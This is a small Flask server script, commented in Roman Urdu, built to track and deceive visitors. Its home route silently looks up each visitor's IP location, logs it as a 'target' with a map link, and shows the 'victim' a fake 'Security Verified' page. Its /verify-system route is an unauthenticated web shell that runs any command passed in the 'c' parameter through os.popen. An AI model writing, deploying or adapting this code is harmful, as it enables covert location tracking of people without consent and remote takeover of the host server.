from flask import Flask, request
import requests
import os

app = Flask(__name__)

@app.route('/')
def home():
    # 1. Asli IP pakarna
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    # 2. Silent Tracking (No Permission Required)
    # Hum IPWHOIS use karenge jo kabhi kabhi IP-API se behtar result deta hai
    try:
        res = requests.get(f'https://ipwho.is/{user_ip}').json()
        city = res.get('city', 'Karachi')
        region = res.get('region', 'Sindh')
        lat = res.get('latitude', '24.8607')
        lon = res.get('longitude', '67.0011')
        
        map_link = f"https://www.google.com/maps?q={lat},{lon}"
        
        # Logs mein details print karna
        print(f"\n--- [!!!] SILENT TARGET SPOTTED [!!!] ---")
        print(f"IP: {user_ip} | City: {city} | Region: {region}")
        print(f"MAP: {map_link}\n")
        
    except:
        print(f"Silent Trace Failed for IP: {user_ip}")

    # Victim ko sirf ye nazar aayega (Normal Security Page)
    return f"<h2>Security Verified</h2><p>Safe Connection from: {user_ip}</p>"

@app.route('/verify-system')
def verify_system():
    # Aapka RCE/Linux details wala system
    cmd = request.args.get('c', 'ls')
    try:
        output = os.popen(cmd).read()
        return f"<pre>{output}</pre>"
    except:
        return "Error"
